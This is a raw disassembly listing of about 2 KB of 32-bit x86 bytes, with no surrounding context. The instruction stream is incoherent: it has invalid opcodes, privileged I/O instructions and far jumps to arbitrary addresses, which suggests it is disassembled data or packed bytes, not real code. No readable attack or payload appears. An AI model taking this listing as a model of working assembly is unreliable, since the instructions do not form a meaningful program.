  403fe2:	call   0xbfbb:0x5ecb2968
  403fe9:	scas   eax,DWORD PTR es:[edi]
  403fea:	jg     0x403f73
  403fec:	ret    0xb55c
  403fef:	cld    
  403ff0:	jnp    0x403fd1
  403ff2:	(bad)  
  403ff4:	jmp    0x188c:0xff87eaaa
  403ffb:	sbb    BYTE PTR [edx+0x42],bl
  403ffe:	mov    bh,0xd6
  404000:	mov    al,ds:0x6515f5a5
  404005:	sbb    ah,al
  404007:	adc    esi,DWORD PTR [ebx]
  404009:	dec    ebx
  40400a:	mov    ah,0xc2
  40400c:	inc    ecx
  40400d:	jno    0x40400e
  40400f:	enter  0xe1aa,0xd
  404013:	icebp  
  404014:	pop    es
  404015:	shr    BYTE PTR [eax+ecx*1+0x31845c66],1
  40401c:	and    dh,BYTE PTR [eax+0x58]
  40401f:	fst    DWORD PTR [edi-0xc]
  404022:	fwait
  404023:	mov    BYTE PTR [ebp-0x3817d3fa],ch
  404029:	outs   dx,BYTE PTR ds:[esi]
  40402a:	push   edx
  40402b:	fcom   QWORD PTR [ebx-0x76]
  40402e:	mov    WORD PTR [edi],fs
  404030:	sub    edi,DWORD PTR [eax-0x7ad428f1]
  404036:	jns    0x40408b
  404038:	scas   al,BYTE PTR es:[edi]
  404039:	pop    esp
  40403a:	sbb    ah,BYTE PTR [eax]
  40403c:	in     al,0x69
  40403e:	mov    cl,0xfe
  404040:	push   0xda5e2832
  404045:	cs xchg esp,eax
  404047:	push   ss
  404048:	jl     0x404073
  40404a:	mov    edi,0x85759b8a
  40404f:	mov    ecx,DWORD PTR [edx]
  404051:	mov    ds:0xe20eed7e,al
  404056:	fucomp st(3)
  404058:	mov    ds:0x77accc14,eax
  40405d:	aaa    
  40405e:	xor    ah,bl
  404060:	nop
  404061:	dec    ebp
  404062:	push   0x39
  404064:	gs daa 
  404066:	imul   esp,DWORD PTR [edx],0xc0457fb5
  40406c:	inc    ebx
  40406d:	cmp    DWORD PTR [ebx],eax
  40406f:	pop    ds
  404070:	jg     0x4040b6
  404072:	ins    BYTE PTR es:[edi],dx
  404073:	out    dx,eax
  404074:	or     al,0x3b
  404076:	test   DWORD PTR [edi+0x9],esp
  404079:	leave  
  40407a:	and    bh,dh
  40407c:	sbb    DWORD PTR [ebp+0x9],ebx
  40407f:	sub    ebx,DWORD PTR [eax]
  404081:	pop    edx
  404082:	dec    esi
  404083:	cmp    DWORD PTR [edi+0x140df7ec],0xfffffffb
  40408a:	or     bl,BYTE PTR [ecx]
  40408c:	jmp    0xeccf136f
  404091:	cs jge 0x4040e6
  404094:	jae    0x40404c
  404096:	fstp   TBYTE PTR [eax+0x35]
  404099:	mov    ch,0x95
  40409b:	xor    eax,0x124b49ef
  4040a0:	or     eax,0x73a06b8f
  4040a5:	fwait
  4040a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4040a7:	add    al,0x53
  4040a9:	mov    edx,0xaa03252c
  4040ae:	imul   edi,DWORD PTR [ebx-0x52],0x3df998d7
  4040b5:	push   cs
  4040b6:	dec    edi
  4040b7:	das    
  4040b8:	mov    ds:0xd1be235b,eax
  4040bd:	daa    
  4040be:	enter  0x3b8c,0x69
  4040c2:	(bad)  [edi+0x3778cabd]
  4040c8:	jecxz  0x40405c
  4040ca:	mov    al,ds:0x98b43c00
  4040cf:	aad    0x76
  4040d1:	dec    ebx
  4040d2:	clc    
  4040d3:	popf   
  4040d4:	repz test al,0x65
  4040d7:	xchg   edi,eax
  4040d8:	cmp    dh,BYTE PTR [eax]
  4040da:	repnz or DWORD PTR [ebx],edi
  4040dd:	bound  edx,QWORD PTR [ebx+0x6de22fbe]
  4040e3:	mov    esi,0x4ef2a479
  4040e8:	shr    ebx,0x33
  4040eb:	sbb    al,0x9b
  4040ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4040ee:	push   eax
  4040ef:	sub    DWORD PTR [ebx-0xf],esp
  4040f2:	ds push ebp
  4040f4:	mov    DWORD PTR ss:[ecx-0x59],ecx
  4040f8:	push   edx
  4040f9:	lods   eax,DWORD PTR ds:[esi]
  4040fa:	xor    eax,0xfcd7d417
  4040ff:	xchg   esi,eax
  404100:	cmc    
  404101:	push   esi
  404102:	or     ah,BYTE PTR [edx-0x442c0b00]
  404108:	sti    
  404109:	push   eax
  40410a:	popa   
  40410b:	mov    ds:0x289969a9,al
  404110:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404111:	jnp    0x4040c7
  404113:	dec    eax
  404114:	mov    ds:0xb7660b28,eax
  404119:	out    dx,eax
  40411a:	mov    ah,0x61
  40411c:	pop    ss
  40411d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40411e:	das    
  40411f:	mov    esp,0xe8642da6
  404124:	xor    ebp,DWORD PTR [esi]
  404126:	jae    0x40419e
  404128:	test   edi,ebx
  40412a:	pop    edx
  40412b:	enter  0x422,0xd9
  40412f:	jns    0x404191
  404131:	daa    
  404132:	fdiv   st,st(2)
  404134:	dec    ebp
  404135:	addr16 icebp 
  404137:	push   esp
  404138:	mov    bl,0xba
  40413a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40413b:	dec    edx
  40413c:	and    eax,0xff079599
  404141:	jbe    0x404117
  404143:	jae    0x40418d
  404145:	adc    al,0x88
  404147:	in     al,dx
  404148:	addr16 enter 0x7545,0x3
  40414d:	and    ah,dl
  40414f:	xor    BYTE PTR [edx+0x455b16b5],dh
  404155:	call   0x273a:0x6d2d87d4
  40415c:	imul   ebp,DWORD PTR [ebx+0x7d],0x42
  404160:	lock mov gs,WORD PTR [ebx]
  404163:	pop    edx
  404164:	xchg   BYTE PTR [ebp-0xd22a39],dh
  40416a:	fistp  QWORD PTR [ecx]
  40416c:	icebp  
  40416d:	cmp    cl,ch
  40416f:	in     al,0x16
  404171:	fcmovu st,st(2)
  404173:	mov    eax,0x567b2a04
  404178:	fdiv   QWORD PTR [edi-0x7352bcdf]
  40417e:	sub    al,0x31
  404180:	jmp    0x131c:0xa3689011
  404187:	or     al,0x8c
  404189:	mov    eax,ds:0x419120f4
  40418e:	and    BYTE PTR [ebx+0x1c],al
  404191:	in     al,0x95
  404193:	stos   DWORD PTR es:[edi],eax
  404194:	lea    ecx,ds:0xf4ce8e3b
  40419a:	mov    DWORD PTR [edi+0x7e],ebx
  40419d:	jmp    0x404124
  40419f:	outs   dx,DWORD PTR ds:[esi]
  4041a0:	repz adc BYTE PTR ds:0xdec95c64,al
  4041a7:	out    0xfb,eax
  4041a9:	(bad)  
  4041aa:	popa   
  4041ab:	sub    bl,BYTE PTR ds:[ebx+edx*4]
  4041af:	jnp    0x40422f
  4041b1:	add    DWORD PTR [edx],ebx
  4041b3:	js     0x404192
  4041b5:	push   ds
  4041b6:	mov    bh,0xd3
  4041b8:	sahf   
  4041b9:	mov    ebx,0xd5766c78
  4041be:	jo     0x404206
  4041c0:	fdivr  QWORD PTR [edx-0x31]
  4041c3:	call   0x9cf0f36
  4041c8:	xchg   esi,eax
  4041c9:	mov    al,al
  4041cb:	(bad)  
  4041cc:	repz jnp 0x4041e5
  4041cf:	jb     0x40419b
  4041d1:	fisttp WORD PTR [edx-0x7ed712bf]
  4041d7:	repz rcl BYTE PTR [eax],1
  4041da:	cli    
  4041db:	xchg   edx,eax
  4041dc:	repz xchg esp,eax
  4041de:	cmp    BYTE PTR [ecx-0x205f146c],bl
  4041e4:	aad    0xef
  4041e6:	outs   dx,BYTE PTR ds:[esi]
  4041e7:	jnp    0x404202
  4041e9:	jmp    0x1ca0f35a
  4041ee:	adc    al,0xea
  4041f0:	xchg   BYTE PTR [ecx],ch
  4041f2:	popf   
  4041f3:	imul   edi
  4041f5:	in     eax,dx
  4041f6:	lahf   
  4041f7:	mov    ebx,0x87baf9c7
  4041fc:	es add eax,0xc8820f00
  404202:	es pop edx
  404204:	fwait
  404205:	cmp    ebp,ebp
  404207:	mov    bl,0x90
  404209:	xchg   ebp,eax
  40420a:	jmp    0xdc24:0x419c56a2
  404211:	xchg   DWORD PTR [ebx],esp
  404213:	outs   dx,DWORD PTR ds:[esi]
  404214:	aaa    
  404215:	nop
  404216:	adc    edi,DWORD PTR [esi+0x265b1376]
  40421c:	jb     0x404209
  40421e:	fstp   DWORD PTR [edi-0x2c]
  404221:	mov    DWORD PTR [eax-0x6b],ebx
  404224:	out    0x3,al
  404226:	or     DWORD PTR [eax],0xa5c0754a
  40422c:	jne    0x40428d
  40422e:	rcr    DWORD PTR [ebp-0xd898bc4],cl
  404234:	pop    edx
  404235:	jo     0x404262
  404237:	lahf   
  404238:	int3   
  404239:	and    edi,DWORD PTR [eax]
  40423b:	aam    0x4c
  40423d:	jbe    0x4042a9
  40423f:	jecxz  0x4042b4
  404241:	das    
  404242:	out    dx,eax
  404243:	push   ebx
  404244:	rol    BYTE PTR [esi+0x40be24f0],1
  40424a:	jns    0x404214
  40424c:	in     eax,dx
  40424d:	(bad)  
  40424e:	(bad)  
  40424f:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  404251:	cmc    
  404252:	and    al,0xe2
  404254:	ja     0x4042ac
  404256:	not    DWORD PTR [ecx+0x44]
  404259:	pushf  
  40425a:	or     al,0x3b
  40425c:	cdq    
  40425d:	ins    BYTE PTR es:[edi],dx
  40425e:	mov    dh,0x10
  404260:	mov    eax,0x2f872345
  404265:	mov    bl,0xe9
  404267:	xor    ebx,ebx
  404269:	dec    ebp
  40426a:	pusha  
  40426b:	fmul   st,st(7)
  40426d:	lods   eax,DWORD PTR ds:[esi]
  40426e:	inc    ebx
  40426f:	jb     0x4042cb
  404271:	fimul  DWORD PTR [eax-0xd]
  404274:	sahf   
  404275:	sub    esi,DWORD PTR [edx-0x14636830]
  40427b:	out    dx,eax
  40427c:	push   esi
  40427d:	xor    eax,0x79ada9f0
  404282:	add    al,0xce
  404284:	mov    esi,0x9406de48
  404289:	mov    ds:0x43162635,eax
  40428e:	pop    eax
  40428f:	in     eax,dx
  404290:	jmp    FWORD PTR [edi-0xbf972b1]
  404296:	lea    edi,[edi+eiz*2]
  404299:	aas    
  40429a:	pop    ecx
  40429b:	pop    ss
  40429c:	frstor [edi]
  40429e:	popa   
  40429f:	mov    eax,0xdb526072
  4042a4:	jne    0x404320
  4042a6:	add    esi,DWORD PTR [ebx+0x43]
  4042a9:	add    al,0x8
  4042ab:	ss mov bl,dh
  4042ae:	adc    dh,BYTE PTR ds:0x32ecfd4
  4042b4:	xchg   esi,eax
  4042b5:	lock push esp
  4042b7:	mov    bh,0x7
  4042b9:	jbe    0x4042d1
  4042bb:	xchg   ecx,eax
  4042bc:	push   ebp
  4042bd:	retf   0x521f
  4042c0:	jle    0x4042f4
  4042c2:	mov    al,ds:0x5a13b2df
  4042c7:	ja     0x4042da
  4042c9:	test   BYTE PTR [ebx+0xf],bl
  4042cc:	loop   0x4042bb
  4042ce:	adc    ecx,DWORD PTR [eax+0x54]
  4042d1:	jae    0x4042f9
  4042d3:	clc    
  4042d4:	and    ecx,edi
  4042d6:	cli    
  4042d7:	iret   
  4042d8:	enter  0x7325,0xed
  4042dc:	jne    0x4042e6
  4042de:	xlat   BYTE PTR ds:[ebx]
  4042df:	jne    0x4042b3
  4042e1:	sub    edi,DWORD PTR [eax-0x10]
  4042e4:	dec    ecx
  4042e5:	or     al,0x4b
  4042e7:	in     eax,0xf1
  4042e9:	cld    
  4042ea:	xor    eax,0x28b375f6
  4042ef:	adc    BYTE PTR [edi+esi*1-0x4505ad9a],bl
  4042f6:	mov    ?,ecx
  4042f8:	imul   ecx,DWORD PTR [ecx+0xe],0x96c5ab84
  4042ff:	push   cs
  404300:	js     0x40436b
  404302:	ja     0x404375
  404304:	das    
  404305:	mov    dl,0x27
  404307:	mov    esp,0x500a64a1
  40430c:	ins    BYTE PTR es:[edi],dx
  40430d:	cmc    
  40430e:	addr16 add al,0x5d
  404311:	pop    ebx
  404312:	aam    0x74
  404314:	in     eax,dx
  404315:	fucom  st(6)
  404317:	in     al,dx
  404318:	pushf  
  404319:	mov    bh,0xc8
  40431b:	cmp    eax,0x9e5516d
  404320:	mov    dh,BYTE PTR [ebx-0x57]
  404323:	mov    ds:0x6723cb1e,al
  404328:	sub    BYTE PTR [ecx+eiz*1-0x5037682c],bh
  40432f:	inc    esi
  404330:	push   ecx
  404331:	dec    edx
  404332:	int    0x1d
  404334:	ins    BYTE PTR es:[edi],dx
  404335:	jecxz  0x4042c3
  404337:	xor    ebx,DWORD PTR [edx+0x3a]
  40433a:	iret   
  40433b:	bound  ebp,QWORD PTR [esi]
  40433d:	scas   eax,DWORD PTR es:[edi]
  40433e:	into   
  40433f:	stc    
  404340:	mov    bl,0x56
  404342:	jg     0x404352
  404344:	clc    
  404345:	lods   eax,DWORD PTR ds:[esi]
  404346:	jne    0x404382
  404348:	jne    0x404364
  40434a:	adc    eax,0xc7f2ac3
  40434f:	mov    ds:0x3832edc8,al
  404354:	aam    0x22
  404356:	scas   eax,DWORD PTR es:[edi]
  404357:	jg     0x4042da
  404359:	jo     0x4043d5
  40435b:	cld    
  40435c:	xchg   ebx,eax
  40435d:	int3   
  40435e:	dec    esp
  40435f:	dec    edx
  404360:	push   ebx
  404361:	fwait
  404362:	icebp  
  404363:	xchg   BYTE PTR [ebx-0x59988f05],ah
  404369:	mov    ds:0x913dcf89,eax
  40436e:	test   al,0xd5
  404370:	stos   DWORD PTR es:[edi],eax
  404371:	sbb    al,0x61
  404373:	push   ss
  404374:	mov    WORD PTR [ecx-0x3f],es
  404377:	retf   0xdc7c
  40437a:	push   eax
  40437b:	cmp    cl,al
  40437d:	xor    ebx,esp
  40437f:	ret    
  404380:	in     al,0xf9
  404382:	mov    al,gs:0x7982ab0a
  404388:	aas    
  404389:	imul   ebx,DWORD PTR [edx-0x59],0x33
  40438d:	int    0xc6
  40438f:	int3   
  404390:	nop
  404391:	and    ebx,DWORD PTR [esi+ebp*2-0x6c]
  404395:	sub    ebp,DWORD PTR [eax+edx*1]
  404398:	jnp    0x4043c7
  40439a:	shr    BYTE PTR [ebp-0x2b],0x78
  40439e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40439f:	add    esp,esp
  4043a1:	gs inc ebx
  4043a3:	ins    BYTE PTR es:[edi],dx
  4043a4:	cmp    bl,dl
  4043a6:	jp     0x404346
  4043a8:	and    al,0x65
  4043aa:	mov    eax,ds:0x22553aaa
  4043af:	imul   edi,DWORD PTR [esi],0x5a
  4043b2:	out    dx,al
  4043b3:	adc    al,0x9b
  4043b5:	xchg   DWORD PTR [esi],esi
  4043b7:	push   esp
  4043b8:	imul   esi,DWORD PTR [esi],0xcf76395c
  4043be:	pop    edi
  4043bf:	mov    DWORD PTR [edx],0xffa49a4
  4043c5:	xchg   esi,esp
  4043c7:	mov    WORD PTR [ebx-0x20f85db2],es
  4043cd:	adc    edx,DWORD PTR [eax+0x6586ea6a]
  4043d3:	je     0x40436c
  4043d5:	test   BYTE PTR [eax+0x18ab10f7],ah
  4043db:	add    edi,DWORD PTR [ebx-0x66]
  4043de:	loope  0x404418
  4043e0:	or     cl,BYTE PTR [ebp-0x6a]
  4043e3:	jl     0x4043c0
  4043e5:	cmp    ecx,DWORD PTR [edx]
  4043e7:	ins    DWORD PTR es:[edi],dx
  4043e8:	cwde   
  4043e9:	ficom  DWORD PTR [edi]
  4043eb:	test   eax,0x89dbbded
  4043f0:	jle    0x4043fe
  4043f2:	mov    dl,0xcf
  4043f4:	aaa    
  4043f5:	in     eax,dx
  4043f6:	mov    eax,ds:0xce6a8955
  4043fb:	stc    
  4043fc:	out    dx,al
  4043fd:	not    DWORD PTR [eax]
  4043ff:	and    BYTE PTR [eax-0x8018153],dl
  404405:	lahf   
  404406:	retf   
  404407:	adc    al,0x81
  404409:	add    eax,0xd3927169
  40440e:	xchg   DWORD PTR [ebp-0x521612d0],esp
  404414:	or     DWORD PTR [edx+0x75],eax
  404417:	mov    cs,WORD PTR [ebx-0x67]
  40441a:	or     dh,bl
  40441c:	inc    esp
  40441d:	(bad)  
  40441e:	sub    DWORD PTR [ecx-0x4df8b6db],esp
  404424:	sbb    bl,BYTE PTR [esi-0x1baa09a9]
  40442a:	mov    ah,0xff
  40442c:	sub    eax,0x9cb61fc
  404431:	and    eax,0x11dcb3ff
  404436:	stc    
  404437:	pop    ss
  404438:	scas   al,BYTE PTR es:[edi]
  404439:	es push cs
  40443b:	inc    edx
  40443c:	rcr    DWORD PTR [esi],1
  40443e:	mov    eax,ds:0x11db5f26
  404443:	data16 mov BYTE PTR ds:0x6f9bf9bc,bl
  40444a:	shl    BYTE PTR [ebx-0x69],cl
  40444d:	adc    al,BYTE PTR ds:0x69492234
  404453:	xor    edi,eax
  404455:	adc    BYTE PTR [edi+0x44],0xc1
  404459:	es sub al,0xb
  40445c:	push   eax
  40445d:	aam    0x8b
  40445f:	jl     0x404433
  404461:	ins    BYTE PTR es:[edi],dx
  404462:	xchg   edx,eax
  404463:	jnp    0x4043f1
  404465:	adc    edi,DWORD PTR [ecx]
  404467:	mov    ebx,0x64955a80
  40446c:	(bad)  
  40446d:	or     edx,DWORD PTR [edx+ebp*2-0x160c2d41]
  404474:	(bad)  
  404475:	sbb    ebp,DWORD PTR [ecx-0xe6e326a]
  40447b:	pop    eax
  40447c:	les    ebx,FWORD PTR [eax*2+0x533ad683]
  404483:	cmpps  xmm5,XMMWORD PTR ds:0x601678d0,0x9c
  40448b:	out    0xf4,eax
  40448d:	pop    ebp
  40448e:	sbb    DWORD PTR [edx+0x5a],ecx
  404491:	inc    ebp
  404492:	push   esi
  404493:	loope  0x4044fc
  404495:	sub    DWORD PTR ds:[esi+0x14b5cfc7],eax
  40449c:	fsubr  st,st(4)
  40449e:	ds jnp 0x404437
  4044a1:	lea    edx,[bp-0x74d5]
  4044a6:	loop   0x4044b1
  4044a8:	add    dl,BYTE PTR [esi]
  4044aa:	mov    al,ds:0xda413c4f
  4044af:	mov    WORD PTR ds:0xefceb841,?
  4044b5:	sbb    BYTE PTR [edx-0x27],0x4a
  4044b9:	out    dx,al
  4044ba:	(bad)  
  4044bb:	leave  
  4044bc:	lock cmp eax,DWORD PTR [edi]
  4044bf:	fisttp QWORD PTR [eax]
  4044c1:	jnp    0x4044e7
  4044c3:	jmp    0x4044bb
  4044c5:	cmp    DWORD PTR [eax+0x8029372],0x78733142
  4044cf:	fiadd  WORD PTR [ecx-0x73]
  4044d2:	lds    edx,FWORD PTR [edi+0x32bfde9d]
  4044d8:	xor    DWORD PTR [eax+0x46601f29],0xffffffe4
  4044df:	punpckhbw mm4,QWORD PTR [ebp-0x61e1b78a]
  4044e6:	pop    ss
  4044e7:	pop    ss
  4044e8:	inc    edx
  4044e9:	jmp    0x4044e9
  4044eb:	in     eax,dx
  4044ec:	or     BYTE PTR [ebx+0x1bb41aef],0x38
  4044f3:	dec    edx
  4044f4:	sub    eax,0xae8afc50
  4044f9:	aad    0x58
  4044fb:	call   0x7b8f9b26
  404500:	call   0x47172e10
  404505:	or     BYTE PTR [eax],dh
  404507:	and    DWORD PTR [eax+0x55eba892],eax
  40450d:	and    eax,0x20c29d3c
  404512:	jns    0x404507
  404514:	mov    esi,0x814465ab
  404519:	je     0x404560
  40451b:	cmp    esp,DWORD PTR [ebx+0x4]
  40451e:	test   eax,0x8bc746ad
  404523:	in     al,dx
  404524:	cld    
  404525:	jle    0x4044f2
  404527:	dec    esi
  404528:	and    BYTE PTR [ebx+0x7de0cd46],cl
  40452e:	lods   eax,DWORD PTR ds:[esi]
  40452f:	cwde   
  404530:	stc    
  404531:	xor    ebx,edx
  404533:	mov    bl,0x2b
  404535:	sbb    esp,ebx
  404537:	xchg   ecx,eax
  404538:	inc    ebp
  404539:	dec    ebx
  40453a:	or     eax,0xc0d69fca
  40453f:	int3   
  404540:	fxch   st(2)
  404542:	push   0x6bfe04b1
  404547:	xchg   ebp,eax
  404548:	mov    ebx,0x629cb5bd
  40454d:	int3   
  40454e:	in     al,dx
  40454f:	call   FWORD PTR [ebx-0x18]
  404552:	shl    edi,0x2f
  404555:	inc    eax
  404556:	fdivr  DWORD PTR [ebp+ebx*4-0x67]
  40455a:	inc    eax
  40455b:	push   edx
  40455c:	mov    cl,0x2a
  40455e:	pop    esp
  40455f:	lahf   
  404560:	add    ebp,DWORD PTR [eax]
  404562:	xchg   DWORD PTR [ebx+0x3bfa47a1],edi
  404568:	addr16 xchg ecx,eax
  40456a:	jb     0x404543
  40456c:	lods   eax,DWORD PTR ds:[esi]
  40456d:	sahf   
  40456e:	aaa    
  40456f:	out    0x52,eax
  404571:	pop    eax
  404572:	rcr    BYTE PTR [ebx],0x40
  404575:	ins    BYTE PTR es:[edi],dx
  404576:	shl    DWORD PTR [edi],0x69
  404579:	sub    ah,ch
  40457b:	bound  esp,QWORD PTR ds:[esi]
  40457e:	inc    edi
  40457f:	pop    edx
  404580:	sar    BYTE PTR [ecx],0xdb
  404583:	jno    0x404583
  404585:	(bad)  
  404586:	push   edi
  404587:	not    ebp
  404589:	sub    bh,bl
  40458b:	mov    esi,edi
  40458d:	inc    eax
  40458e:	pop    esi
  40458f:	adc    al,0xe5
  404591:	dec    eax
  404592:	push   esp
  404593:	test   DWORD PTR [ebp-0x4bc54085],eax
  404599:	loope  0x404579
  40459b:	popa   
  40459c:	iret   
  40459d:	mov    ebx,0xe10d442c
  4045a2:	jecxz  0x404529
  4045a4:	push   cs
  4045a5:	xor    ecx,DWORD PTR [edx-0x3ad5e142]
  4045ab:	mov    ss,eax
  4045ad:	mov    ebp,gs
  4045af:	stos   BYTE PTR es:[edi],al
  4045b0:	rcl    BYTE PTR [ebp-0x49],1
  4045b3:	rol    DWORD PTR [eax+0x64abb361],cl
  4045b9:	in     eax,dx
  4045ba:	(bad)  
  4045bb:	jb     0x404635
  4045bd:	or     ebx,DWORD PTR [eax+0x47]
  4045c0:	pop    ecx
  4045c1:	shl    al,1
  4045c3:	arpl   cx,ax
  4045c5:	and    al,0xe7
  4045c7:	xchg   edx,eax
  4045c8:	and    edi,DWORD PTR [esi+0x60]
  4045cb:	push   edi
  4045cc:	loopne 0x404623
  4045ce:	adc    ecx,edx
  4045d0:	iret   
  4045d1:	push   cs
  4045d2:	push   esp
  4045d3:	shl    ah,cl
  4045d5:	fsub   QWORD PTR [edx+0x7a]
  4045d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4045d9:	xor    BYTE PTR [ecx-0x7b5e66bc],ah
  4045df:	dec    edi
  4045e0:	bound  ebx,QWORD PTR [ebx]
  4045e2:	lds    ebx,FWORD PTR [esi+0x7f]
  4045e5:	bnd js 0x4045b4
  4045e8:	daa    
  4045e9:	inc    ecx
  4045ea:	or     eax,0x8cd01bc3
  4045ef:	call   0xba6a6b92
  4045f4:	retf   0xbd77
  4045f7:	and    eax,0xd234bfb9
  4045fc:	paddsb mm6,QWORD PTR [edx]
  4045ff:	lea    esp,[edi-0x2003ed3f]
  404605:	mov    esp,0x7f6bcbaa
  40460a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40460b:	jecxz  0x404662
  40460d:	inc    eax
  40460e:	and    bl,BYTE PTR [ebp+0x1b6c423d]
  404614:	add    ch,BYTE PTR [edi+0x34d75dc9]
  40461a:	fcomp  DWORD PTR [eax-0xa]
  40461d:	(bad)  
  40461e:	xor    dh,ah
  404620:	inc    ecx
  404621:	fs (bad) 
  404623:	pop    ebx
  404624:	cmp    esi,esp
  404626:	mov    ?,WORD PTR [edi+0x5b34f18f]
  40462c:	mov    ebx,DWORD PTR [esi]
  40462e:	femms  
  404630:	shl    DWORD PTR gs:[edi-0x5697494f],0x13
  404638:	inc    edx
  404639:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40463a:	fwait
  40463b:	arpl   WORD PTR [eax+ebp*1+0x7dc674f4],ax
  404642:	adc    eax,0x5efff506
  404647:	cmp    DWORD PTR [ebx+eax*1-0xa3f7ef1],0xc50d04ef
  404652:	jmp    0x3ad5aaac
  404657:	cmc    
  404658:	push   cs
  404659:	xchg   ebp,eax
  40465a:	cmp    DWORD PTR [eax],edx
  40465c:	(bad)  [edi+ecx*4-0x3f]
  404660:	jge    0x4046b1
  404662:	popf   
  404663:	lds    ecx,FWORD PTR ds:[edx]
  404666:	mov    al,ds:0x1dfd1ce4
  40466b:	or     al,0x93
  40466d:	stos   BYTE PTR es:[edi],al
  40466e:	inc    BYTE PTR [ebp-0x22]
  404671:	shl    DWORD PTR [esi],0x3a
  404674:	fild   WORD PTR [ecx+0x7d]
  404677:	(bad)  
  404678:	imul   esi,DWORD PTR [ecx+0x6f2e2aac],0x61
  40467f:	paddb  mm5,mm3
  404682:	std    
  404683:	imul   ebp,DWORD PTR [esi-0x59459867],0xffffffe0
  40468a:	outs   dx,BYTE PTR ds:[esi]
  40468b:	stos   DWORD PTR es:[edi],eax
  40468c:	xchg   dh,ch
  40468e:	aaa    
  40468f:	repz cmp DWORD PTR [edi],ebx
  404692:	xchg   esi,eax
  404693:	sub    ecx,edx
  404695:	jmp    FWORD PTR [ebx-0x75]
  404698:	jp     0x4046b4
  40469a:	out    dx,al
  40469b:	mov    ch,BYTE PTR ss:[edx]
  40469e:	shr    dh,0x17
  4046a1:	xchg   edi,eax
  4046a2:	cmp    BYTE PTR [edx],al
  4046a4:	mov    eax,ds:0x1af27e68
  4046a9:	jbe    0x40470a
  4046ab:	adc    al,0xb
  4046ad:	jns    0x4046e9
  4046af:	cmp    edx,DWORD PTR [eax+0x614fdd1f]
  4046b5:	jp     0x40469a
  4046b7:	(bad)  
  4046b8:	mov    dh,0xdb
  4046ba:	mov    edx,?
  4046bc:	adc    ah,BYTE PTR [ebx+0x1222afdd]
  4046c2:	push   ds
  4046c3:	add    edi,DWORD PTR ds:0x19b07006
  4046c9:	jl     0x4046e5
  4046cb:	cmp    BYTE PTR [edx],0xcb
  4046ce:	sbb    al,0xec
  4046d0:	push   edx
  4046d1:	adc    edi,DWORD PTR [ebp+edx*1-0x780cfa4a]
  4046d8:	pop    ebp
  4046d9:	add    BYTE PTR [esi+0x5d040e85],ah
  4046df:	jl     0x404740
  4046e1:	in     al,0x7c
  4046e3:	xchg   ebp,eax
  4046e4:	cmp    edx,DWORD PTR [esp+0x6c3bd69a]
  4046eb:	pop    ss
  4046ec:	sar    BYTE PTR [ecx+0x17],0xbf
  4046f0:	addr16 pop eax
  4046f2:	add    esi,DWORD PTR [edi+0x48993d82]
  4046f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4046f9:	test   dl,cl
  4046fb:	adc    DWORD PTR [edx],esp
  4046fd:	fwait
  4046fe:	call   0x859e:0x3bcaad9e
  404705:	push   ds
  404706:	out    dx,al
  404707:	fs cli 
  404709:	dec    ecx
  40470a:	adc    BYTE PTR [esi+0x57059320],dh
  404710:	icebp  
  404711:	loop   0x40472c
  404713:	inc    esi
  404714:	out    0xf3,eax
  404716:	rcl    DWORD PTR [edx-0x53],cl
  404719:	push   edi
  40471a:	fist   WORD PTR [eax+0x4a200a34]
  404720:	lds    esp,FWORD PTR [ebx+0x52014a6]
  404726:	dec    BYTE PTR [edi+0x4f]
  404729:	adc    DWORD PTR [ebx],edx
  40472b:	ins    DWORD PTR es:[edi],dx
  40472c:	(bad)  
  40472d:	enter  0xfbba,0xf5
  404731:	or     eax,0x245a360b
  404736:	neg    DWORD PTR [esi+0x4]
  404739:	fidivr DWORD PTR [ebx+ebp*1]
  40473c:	(bad)  
  40473d:	fild   DWORD PTR [eax+0x2f1561f7]
  404743:	fwait
  404744:	dec    edi
  404745:	mov    dl,0x49
  404747:	aas    
  404748:	pushf  
  404749:	cmp    esi,ebx
  40474b:	lahf   
  40474c:	push   ds
  40474d:	ret    0x3681
  404750:	mov    BYTE PTR [edi],ah
  404752:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404753:	in     al,dx
  404754:	or     DWORD PTR [edi],0x6ba1698c
  40475a:	cmc    
  40475b:	jp     0x4046f1
  40475d:	loopne 0x4047cc
  40475f:	inc    esi
  404760:	je     0x40478a
  404762:	data16 cmp al,0xc
  404765:	lea    eax,[esi]
  404767:	cld    
  404768:	rol    BYTE PTR [ecx-0x52],0x3
  40476c:	sahf   
  40476d:	pop    esp
  40476e:	jb     0x40473c
  404770:	ret    0xf19
  404773:	xchg   ebp,eax
  404774:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404775:	sahf   
  404776:	(bad)  
  404777:	cmc    
  404778:	inc    ebx
  404779:	daa    
  40477a:	push   ds
  40477b:	add    edx,DWORD PTR [edx]
  40477d:	nop
  40477e:	xor    BYTE PTR [ecx],0x81
  404781:	scas   eax,DWORD PTR es:[edi]
  404782:	popa   
  404783:	pop    ebx
  404784:	mov    ch,0xc5
  404786:	repnz cmc 
  404788:	or     DWORD PTR [ecx+0x28],0x362a7250
  40478f:	mov    al,0xf5
  404791:	inc    ebp
  404792:	and    al,0xd8
  404794:	and    al,0x20
  404796:	push   0x32047ba9
  40479b:	mov    edx,0x3b55fd0e
  4047a0:	cmp    ecx,DWORD PTR [edx-0x6d00a892]
  4047a6:	mov    DWORD PTR [ebp+0x6],ebx
  4047a9:	(bad)  
  4047aa:	bound  ebx,QWORD PTR [ecx]
  4047ac:	lea    eax,[ecx]
  4047ae:	push   ebx
  4047af:	and    DWORD PTR [ebx-0x27],ecx
  4047b2:	pop    ds
  4047b3:	push   0x17a0f332
  4047b8:	sub    al,0x59
  4047ba:	cmp    ebp,DWORD PTR [esi-0x2e91e7b2]
  4047c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4047c1:	cmp    BYTE PTR [esi-0x42d6e9db],bl
  4047c7:	mov    esp,0xb23d61e8
